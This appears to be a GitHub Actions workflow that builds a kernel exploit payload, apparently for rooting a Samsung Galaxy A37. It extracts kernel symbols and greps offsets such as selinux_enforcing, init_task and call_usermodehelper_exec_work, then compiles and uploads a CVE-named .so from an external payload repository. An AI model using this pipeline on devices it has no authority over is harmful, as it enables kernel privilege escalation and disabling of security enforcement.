name: Build A37 Payload

on:
  workflow_dispatch:
    inputs:
      build_number:
        description: 'Build number'
        required: true
        default: 'A376BXXU1AZB7'

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y python3-pip lz4
        pip3 install vmlinux-to-elf

    - name: Setup NDK
      run: |
        wget https://dl.google.com/android/repository/android-ndk-r29-linux.zip
        unzip android-ndk-r29-linux.zip
        echo "ANDROID_NDK_HOME=$PWD/android-ndk-r29" >> $GITHUB_ENV
        echo "$PWD/android-ndk-r29/toolchains/llvm/prebuilt/linux-x86_64/bin" >> $GITHUB_PATH

    - name: Clone payload repository
      run: |
        git clone https://github.com/abdgalaxy36-code/Root-My-Galaxy-Payloads.git payload-repo

    - name: Extract symbols from kernel
      run: |
        vmlinux-to-elf kernel vmlinux.elf
        llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm

    - name: Extract BTF from kernel
      run: |
        python3 << 'PYEOF'
        import struct
        with open('kernel', 'rb') as f:
            data = f.read()
        btf_magic = b'\x9f\xeb\x01\x00'
        offset = data.find(btf_magic)
        if offset != -1:
            header = data[offset:offset+24]
            magic, version, flags, header_len, type_off, type_len, str_off, str_len = struct.unpack('<HBBIIIII', header)
            total_size = header_len + type_off + type_len + str_off + str_len
            btf_data = data[offset:offset+total_size]
            with open('vmlinux.btf', 'wb') as f:
                f.write(btf_data)
            print("BTF extracted successfully")
        else:
            print("No BTF found")
        PYEOF

    - name: Extract offsets
      run: |
        grep -E "call_usermodehelper_exec_work|noop_llseek|generic_file_splice_read|configfs_read_iter|configfs_bin_write_iter|ashmem_ioctl|ashmem_compat_ioctl|ashmem_mmap|ashmem_open|ashmem_release|ashmem_show_fdinfo|anon_pipe_buf_ops|ashmem_fops|nfnetlink_log|kmalloc_caches|system_unbound_wq|nfulnl_logger|init_task|root_task_group|selinux_enforcing|sysctl_bootid" vmlinux.nm > offsets.txt
        cat offsets.txt

    - name: Build payload
      run: |
        cd payload-repo
        make TARGET=a37-${{ github.event.inputs.build_number }} ANDROID_NDK_HOME=$ANDROID_NDK_HOME release

    - name: Upload payload
      uses: actions/upload-artifact@v4
      with:
        name: a37-payload
        path: payload-repo/build/a37-${{ github.event.inputs.build_number }}/cve-2026-43499-app.release.so
